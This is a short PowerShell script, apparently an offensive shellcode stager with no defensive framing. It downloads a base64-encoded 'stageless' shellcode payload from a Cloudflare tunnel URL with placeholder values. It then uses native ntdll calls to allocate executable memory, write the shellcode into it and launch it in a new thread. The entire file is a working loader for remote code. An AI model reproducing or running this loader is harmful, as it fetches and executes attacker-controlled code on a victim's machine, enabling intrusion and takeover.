$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode_stageless.txt?key=PLACEHOLDER_TOKEN"
[Net.ServicePointManager]::SecurityProtocol="Tls12"

$c=@"
using System;using System.Runtime.InteropServices;
public class T{
[DllImport("ntdll.dll")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref IntPtr s,uint t,uint p);
[DllImport("ntdll.dll")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] buf,uint sz,ref uint w);
[DllImport("ntdll.dll")]public static extern uint NtCreateThreadEx(ref IntPtr t,uint a,IntPtr oa,IntPtr h,IntPtr r,IntPtr arg,uint f,IntPtr zb,IntPtr sc,IntPtr sr,IntPtr ab);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
}
"@
Add-Type $c

$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))

$h=[T]::GetCurrentProcess()
$a=[IntPtr]::Zero;$sz=[IntPtr]$sc.Length
[T]::NtAllocateVirtualMemory($h,[ref]$a,[IntPtr]::Zero,[ref]$sz,0x3000,0x40)|Out-Null
if($a -eq [IntPtr]::Zero){return "ALLOC FAIL"}

$w=[uint32]0
[T]::NtWriteVirtualMemory($h,$a,$sc,[uint32]$sc.Length,[ref]$w)|Out-Null

$t=[IntPtr]::Zero
[T]::NtCreateThreadEx([ref]$t,0x1FFFFF,[IntPtr]::Zero,$h,$a,[IntPtr]::Zero,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)|Out-Null
"OK"
